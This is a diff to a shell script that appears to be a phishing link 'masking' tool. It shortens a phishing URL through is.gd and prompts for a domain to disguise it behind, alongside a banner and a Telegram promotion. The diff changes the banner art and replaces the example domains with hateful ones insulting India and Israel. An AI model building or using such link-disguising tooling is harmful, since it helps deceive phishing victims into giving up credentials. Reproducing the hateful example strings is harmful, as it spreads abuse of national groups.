@@ -10,14 +10,14 @@ url_checker() {
 }
 
 
-echo -e "\n\e[1;31;42m KP       KP         KP KP KP KP            \e[0m"   
+echo -e "\n\e[1;31;42m KP       KP         KP KP KP K           \e[0m"   
 echo -e "\n\e[1;31;42m KP     KP           KP       KP            \e[0m"
 echo -e "\n\e[1;31;42m KP    KP            KP       KP            \e[0m"
 echo -e "\n\e[1;31;42m KP   KP             KP       KP            \e[0m"
-echo -e "\n\e[1;31;42m KP KP               KP KP KP KP            \e[0m"
-echo -e "\n\e[1;31;42m KP   KP             KP                     \e[0m"
-echo -e "\n\e[1;31;42m KP     KP           KP                     \e[0m"
-echo -e "\n\e[1;31;42m KP        KP        KP                     \e[0m" 
+echo -e "\n\e[1;31;42m KP KP               KP KP KP K           \e[0m"
+echo -e "\n\e[1;31;42m KP   KP             KP                       \e[0m"
+echo -e "\n\e[1;31;42m KP     KP           KP                       \e[0m"
+echo -e "\n\e[1;31;42m KP        KP        KP                       \e[0m" 
 
 echo -e "\n\e[40;38;5;82m Please Visit \e[30;48;5;82m https://t.me/kreptons_official \e[0m"
 echo -e "\e[30;48;5;82m Copyright \e[40;38;5;82m Abdur Rahman \e[0m \n\n"
@@ -32,7 +32,7 @@ echo ""
 short=$(curl -s "https://is.gd/create.php?format=simple&url=${phish}")
 shorter=${short#https://}
 echo -e "\n\e[1;31;42m ### Masking Domain ###\e[0m"
-echo 'Domain to mask the Phishing URL (with http or https), ex: https://example.com, http://anything.org, https://domain.com) :'
+echo 'Domain to mask the Phishing URL with (http or https), ex: https://fuckindia.com, http://fuckisrael.org, https://domain.com) :'
 echo -en "\e[32m=>\e[0m "
 read mask
 url_checker $mask
